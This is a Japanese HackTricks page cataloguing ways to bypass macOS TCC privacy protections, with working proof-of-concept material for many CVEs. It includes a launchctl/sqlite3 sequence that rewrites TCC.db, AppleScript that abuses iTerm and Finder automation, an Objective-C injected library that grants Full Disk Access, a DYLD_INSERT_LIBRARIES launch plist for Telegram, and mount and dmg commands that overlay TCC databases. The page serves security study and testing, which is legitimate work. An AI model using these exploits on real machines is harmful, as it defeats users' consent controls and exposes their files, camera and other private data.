# macOS TCC バイパス

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** をフォローする。**
* **ハッキングテクニックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>

## 機能別

### 書き込みバイパス

これはバイパスではなく、TCCの動作方法です: **書き込みからは保護されていません**。ターミナルがユーザーのデスクトップを読み取る権限がない場合でも、**それに書き込むことができます**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**拡張属性 `com.apple.macl`** は、新しい**ファイル**に追加され、**作成者のアプリ**がそれを読む権限を与えます。

### TCC ClickJacking

ユーザーが気づかずにそれを**受け入れる**ようにするために、TCCプロンプトの上に**ウィンドウを配置**することが可能です。PoCは[TCC-ClickJacking](https://github.com/breakpointHQ/TCC-ClickJacking)で見つけることができます。

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 任意の名前によるTCCリクエスト

攻撃者は、`Info.plist`で任意の名前（例：Finder、Google Chromeなど）のアプリを作成し、それをいくつかのTCC保護された場所へのアクセスをリクエストするようにします。ユーザーは、正規のアプリケーションがこのアクセスをリクエストしていると思うでしょう。\
さらに、正規のアプリをDockから削除し、代わりに偽物を置くことが可能です。そのため、ユーザーが偽のアプリをクリックすると（同じアイコンを使用できる）、それは正規のアプリを呼び出し、TCCの許可を求め、マルウェアを実行することができ、ユーザーは正規のアプリがアクセスを要求したと信じることになります。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細とPoCは次で確認できます：

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH バイパス

デフォルトでは、**SSH経由のアクセスには「Full Disk Access」が必要**です。これを無効にするには、それがリストされている必要がありますが、無効にする必要があります（リストから削除してもこれらの権限は削除されません）：

![](<../../../../../.gitbook/assets/image (1077).png>)

ここでは、いくつかの**マルウェアがこの保護をバイパスできた例**を見つけることができます：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
SSHを有効にするには、今では**Full Disk Access**が必要です
{% endhint %}

### 拡張子の処理 - CVE-2022-26767

属性**`com.apple.macl`**は、**特定のアプリケーションがそれを読む権限を持つ**ためにファイルに与えられます。この属性は、ファイルをアプリに**ドラッグ＆ドロップ**するか、ユーザーがファイルを**ダブルクリック**してデフォルトのアプリで開くときに設定されます。

したがって、ユーザーは、すべての拡張子を処理する悪意のあるアプリを登録し、Launch Servicesを呼び出して**任意のファイルを開く**ことができます（そのため、悪意のあるファイルはそれを読む権限が与えられます）。

### iCloud

権限**`com.apple.private.icloud-account-access`**を使用すると、**`com.apple.iCloudHelper`** XPCサービスと通信することが可能で、これにより**iCloudトークンが提供**されます。

**iMovie**と**Garageband**にはこの権限と他の権限が付与されていました。

その権限からiCloudトークンを取得する**エクスプロイト**についての詳細については、次のトークを参照してください：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`**権限を持つアプリは、他のアプリを**制御**することができます。これは、他のアプリに付与された権限を**悪用**する可能性があることを意味します。

Apple Scriptsに関する詳細については、次を確認してください：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

たとえば、アプリが**`iTerm`に対してAutomation権限**を持っている場合、この例では**`Terminal`**がiTermにアクセス権を持っています：

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm上で

FDAを持たないTerminalは、FDAを持つiTermを呼び出し、アクションを実行するために使用することができます：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finderを介して

または、アプリがFinderを介してアクセスできる場合、次のようなスクリプトがあるかもしれません：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## アプリケーションの動作による

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

ユーザーランドの**tccdデーモン**は、**`HOME`** **env**変数を使用してTCCユーザーデータベースにアクセスしています: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[このStack Exchangeの投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)によると、TCCデーモンは現在のユーザーのドメイン内で`launchd`を介して実行されているため、**それに渡されるすべての環境変数を制御**することが可能です。\
したがって、**攻撃者は`launchctl`**で`$HOME`環境変数を設定して**制御されたディレクトリ**を指すようにし、**TCC**デーモンを**再起動**してから、TCCデータベースを**直接変更**して、エンドユーザーにプロンプトを表示せずに**利用可能なすべてのTCC権限を自分に与える**ことができます。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - ノート

ノートはTCCで保護された場所にアクセスできましたが、ノートが作成されるときは**保護されていない場所**に作成されます。したがって、ノートに保護されたファイルをコピーするように依頼し、その後ファイルにアクセスできます：

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - トランスロケーション

ライブラリ`libsecurity_translocate`を使用したバイナリ`/usr/libexec/lsd`は、`com.apple.private.nullfs_allow`という権限を持っており、**nullfs** マウントを作成し、`com.apple.private.tcc.allow`と**`kTCCServiceSystemPolicyAllFiles`**を持っていました。これにより、すべてのファイルにアクセスできました。

"Library"に隔離属性を追加し、**`com.apple.security.translocation`** XPCサービスを呼び出すことで、Libraryを**`$TMPDIR/AppTranslocation/d/d/Library`**にマップし、Library内のすべてのドキュメントに**アクセス**できるようになりました。

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`**には興味深い機能があります：実行中に**`~/Music/Music/Media.localized/Automatically Add to Music.localized`**にドロップされたファイルをユーザーの「メディアライブラリ」に**インポート**します。さらに、次のようなものを呼び出します：**`rename(a, b);`** ここで `a` と `b` は次のとおりです：

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

この**`rename(a, b);`**の動作は**競合状態**に対して脆弱であり、`Automatically Add to Music.localized`フォルダに偽の**TCC.db**ファイルを配置し、新しいフォルダ(b)が作成されたときにファイルをコピーして削除し、**`~/Library/Application Support/com.apple.TCC`**/にポイントを指定することが可能でした。

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`** が設定されている場合、**すべてのオープンされたdbがそのパスにコピー**されます。このCVEでは、この制御が悪用され、**TCCデータベースを持つプロセスによって開かれるSQLiteデータベース**内に**書き込む**ことが可能であり、その後**`SQLITE_SQLLOG_DIR`**を**ファイル名にシンボリックリンク**として悪用し、そのデータベースが**開かれる**と、ユーザーの**TCC.dbが開かれたもので上書き**されました。\
**詳細は**[**こちらの解説**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **および**[**こちらのトーク**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s) **にあります**。

### **SQLITE\_AUTO\_TRACE**

環境変数**`SQLITE_AUTO_TRACE`**が設定されている場合、ライブラリ**`libsqlite3.dylib`**はすべてのSQLクエリを**ログ**し始めます。多くのアプリケーションがこのライブラリを使用していたため、すべてのSQLiteクエリをログに取ることが可能でした。

いくつかのAppleアプリケーションは、TCCで保護された情報にアクセスするためにこのライブラリを使用していました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

この**環境変数は、`Metal`フレームワーク**で使用されます。これは、`Music`などのさまざまなプログラムの依存関係であり、FDAを持っています。

次のように設定します：`MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。`path`が有効なディレクトリである場合、バグがトリガーされ、`fs_usage`を使用してプログラム内で何が起こっているかを確認できます：

- `open()`されるファイルは、`path/.dat.nosyncXXXX.XXXXXX`（Xはランダム）と呼ばれます。
- 1つ以上の`write()`がファイルに内容を書き込みます（これは制御できません）。
- `path/.dat.nosyncXXXX.XXXXXX`が`rename()`されて`path/name`になります。

これは、**セキュリティが確保されていない** **`rename(old, new)`**に続く一時ファイルの書き込みです。

これは、**古いパスと新しいパスを別々に解決する必要があるため**、時間がかかり、競合状態に対して脆弱になる可能性があるため、安全ではありません。詳細については、`xnu`関数`renameat_internal()`を確認してください。

{% hint style="danger" %}
つまり、特権プロセスがコントロールしているフォルダから名前を変更する場合、RCEを獲得して異なるファイルにアクセスしたり、このCVEのように特権アプリが作成したファイルを開いてFDを保存したりできます。

名前を変更しているフォルダにアクセスし、ソースファイルを変更したりFDを持っている場合、宛先ファイル（またはフォルダ）をシンボリックリンクに指すように変更できるため、いつでも書き込むことができます。
{% endhint %}

このCVEでの攻撃は次のとおりです：例えば、ユーザーの`TCC.db`を上書きするには：

- `/Users/hacker/ourlink`を`/Users/hacker/Library/Application Support/com.apple.TCC/`を指すように作成します。
- ディレクトリ`/Users/hacker/tmp/`を作成します。
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`を設定します。
- この環境変数を使用して`Music`を実行してバグをトリガーします。
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`（Xはランダム）の`open()`をキャッチします。
- ここでも、このファイルを書き込み用に`open()`し、ファイルディスクリプタを保持します。
- `/Users/hacker/tmp`を`/Users/hacker/ourlink`に**ループ内で**アトミックに切り替えます。
- これは、競合ウィンドウが非常に狭いため、成功する可能性を最大化するために行いますが、競争に負けるとほとんどデメリットがあります。
- 少し待ちます。
- 運が良ければテストします。
- そうでない場合は、最初からやり直します。

詳細は[https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)で確認できます。

{% hint style="danger" %}
今、環境変数`MTL_DUMP_PIPELINES_TO_JSON_FILE`を使用しようとすると、アプリが起動しなくなります。
{% endhint %}

### Apple Remote Desktop

rootとしてこのサービスを有効にすると、**ARDエージェントはフルディスクアクセス**を持ち、ユーザーが新しい**TCCユーザーデータベースをコピー**することができます。

## **NFSHomeDirectory**による

TCCは、ユーザーのHOMEフォルダ内のデータベースを使用して、ユーザー固有のリソースへのアクセスを制御します。したがって、ユーザーが$HOME環境変数を**異なるフォルダ**を指すように再起動できる場合、ユーザーは**/Library/Application Support/com.apple.TCC/TCC.db**に新しいTCCデータベースを作成し、TCCに任意のTCC権限を任意のアプリに付与するようにトリックをかけることができます。

{% hint style="success" %}
Appleは、**`NFSHomeDirectory`**属性内に格納された設定を使用して、**`$HOME`**の値を取得します。したがって、この値を変更する権限（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つアプリケーションを侵害すると、このオプションをTCCバイパスとして**兵器化**することができます。
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**最初のPOC**は、[**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)と[**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)を使用して、ユーザーのHOMEフォルダを変更します。

1. ターゲットアプリケーションの_csreq_ブロブを取得します。
2. 必要なアクセス権限と_csreq_ブロブを持つ偽の_TCC.db_ファイルを配置します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)を使用してユーザーのDirectory Servicesエントリをエクスポートします。
4. ユーザーのホームディレクトリを変更するためにDirectory Servicesエントリを変更します。
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)を使用して変更されたDirectory Servicesエントリをインポートします。
6. ユーザーの_tccd_を停止し、プロセスを再起動します。

**2番目のPOC**は、`/usr/libexec/configd`を使用し、`com.apple.private.tcc.allow`が`kTCCServiceSystemPolicySysAdminFiles`の値を持っていることでした。**`configd`**を**`-t`**オプションで実行すると、攻撃者は**カスタムバンドルをロード**できました。したがって、この脆弱性は、ユーザーのホームディレクトリを変更する**`configd`コードインジェクション**で**`dsexport`**および**`dsimport`**メソッドを置き換えることができました。

詳細については、[**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)を確認してください。

## プロセスインジェクションによる

プロセス内にコードをインジェクトし、そのTCC権限を悪用するさまざまな技術があります：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

さらに、TCCをバイパスするための最も一般的なプロセスインジェクションは、**プラグイン（ライブラリの読み込み）**を介して行われます。\
プラグインは通常、ライブラリまたはplist形式の追加コードであり、**メインアプリケーションによって読み込まれ**、そのコンテキストで実行されます。したがって、メインアプリケーションがTCC制限ファイルにアクセス権限（許可された権限または権限）を持っている場合、**カスタムコードもそれを持つ**ことになります。

### CVE-2020-27937 - Directory Utility

アプリケーション`/System/Library/CoreServices/Applications/Directory Utility.app`は、**`kTCCServiceSystemPolicySysAdminFiles`**の権限を持ち、**`.daplug`**拡張子のプラグインを読み込み、**ハード化されていなかった**ランタイムを持っていました。

このCVEを兵器化するために、**`NFSHomeDirectory`**が変更され（前述の権限を悪用）、TCCをバイパスするためにユーザーのTCCデータベースを**乗っ取る**ことができるようになりました。

詳細については、[**元のレポート**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)を確認してください。
### CVE-2020-29621 - Coreaudiod

バイナリ **`/usr/sbin/coreaudiod`** には、`com.apple.security.cs.disable-library-validation` と `com.apple.private.tcc.manager` の権限がありました。最初の権限は **コードインジェクションを許可** し、2番目の権限は **TCCの管理権限を与えていました**。

このバイナリは、`/Library/Audio/Plug-Ins/HAL` フォルダから **サードパーティプラグインを読み込むことを許可**していました。そのため、この PoC を使用して **プラグインを読み込み、TCCの権限を悪用** することが可能でした：
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**元のレポート**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)をチェックしてください。

### デバイス抽象化レイヤー（DAL）プラグイン

Core Media I/Oを介してカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`**を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL`にあるこれらのプラグインをプロセス内にロードします（SIPで制限されていません）。

そこに一般的な**コンストラクタ**を持つライブラリを保存するだけで、**コードをインジェクト**することができます。

これに対していくつかのAppleアプリケーションが脆弱でした。

### Firefox

Firefoxアプリケーションには、`com.apple.security.cs.disable-library-validation`および`com.apple.security.cs.allow-dyld-environment-variables`の権限がありました。
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
詳細な情報については、[**元のレポートをチェックしてください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には、**`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** の権限があり、これによりプロセス内にコードを注入して TCC 権限を使用することができました。

### CVE-2023-26818 - Telegram

Telegram には、**`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** の権限があり、これによりカメラでの録画などのような権限にアクセスすることが可能でした。[**ライトアップ内にペイロードを見つけることができます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

環境変数を使用してライブラリをロードする方法に注目し、**カスタム plist** を作成してこのライブラリを注入し、**`launchctl`** を使用して起動する方法について説明します：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## オープン呼び出しによるバイパス

サンドボックス化された状態でも**`open`**を呼び出すことが可能です

### ターミナルスクリプト

技術者が使用するコンピュータでは、ターミナルに**Full Disk Access (FDA)**を与えることが一般的です。そして、それを使用して**`.terminal`**スクリプトを呼び出すことが可能です。

**`.terminal`**スクリプトは、以下のような**`CommandString`**キーで実行するコマンドが含まれるplistファイルです：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmpなどの場所にターミナルスクリプトを書き込んで、次のようにコマンドを使って起動する可能性があります：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## マウントによる

### CVE-2020-9771 - mount\_apfs TCC バイパスと権限昇格

**どんなユーザー**（特権を持たないユーザーでも）がタイムマシンのスナップショットを作成し、マウントし、そのスナップショットの**すべてのファイルにアクセス**できます。\
**必要な特権**は、使用されるアプリケーション（例：`Terminal`）が**Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つ必要があり、これは管理者によって許可される必要があります。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

より詳しい説明は[**元のレポート**](https://theevilbit.github.io/posts/cve\_2020\_9771/)に**あります**。

### CVE-2021-1784 & CVE-2021-30808 - TCCファイルをマウントする

TCC DBファイルが保護されていても、新しいTCC.dbファイルを**ディレクトリにマウントする**ことが可能でした：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
### asr

ツール**`/usr/sbin/asr`**は、TCC保護をバイパスしてディスク全体をコピーし、別の場所にマウントすることができました。

### 位置情報サービス

**`/var/db/locationd/clients.plist`**には、**位置情報サービスにアクセスを許可されたクライアントを示す**サードパーティのTCCデータベースがあります。\
フォルダ**`/var/db/locationd/`はDMGマウントから保護されていなかった**ため、独自のplistをマウントすることが可能でした。

## 起動アプリによる

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grepによる

いくつかの場合、ファイルには電子メール、電話番号、メッセージなどの機密情報が非保護の場所に保存されています（これはAppleの脆弱性としてカウントされます）。

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## 合成クリック

これはもはや機能しませんが、[**過去には機能しました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics イベント**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)を使用した別の方法:

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## 参考

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
